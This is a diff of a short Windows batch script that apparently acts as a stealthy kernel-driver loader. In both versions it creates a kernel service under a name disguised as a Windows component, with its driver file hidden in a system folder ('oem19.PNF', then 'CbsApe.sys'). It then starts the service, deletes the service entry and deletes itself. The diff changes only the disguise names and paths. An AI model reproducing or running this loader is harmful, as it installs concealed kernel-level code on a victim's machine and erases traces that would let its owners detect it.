@@ -1,6 +1,6 @@
 @echo off
 cd %~dp0
-sc create CDPUserSvc_74ad3 binpath=C:\Windows\INF\oem19.PNF type=kernel
-sc start CDPUserSvc_74ad3
-sc delete CDPUserSvc_74ad3
+sc create WindowsGdi binpath=C:\Windows\servicing\CbsApe.sys type=kernel
+sc start WindowsGdi
+sc delete WindowsGdi
 del "%~f0"
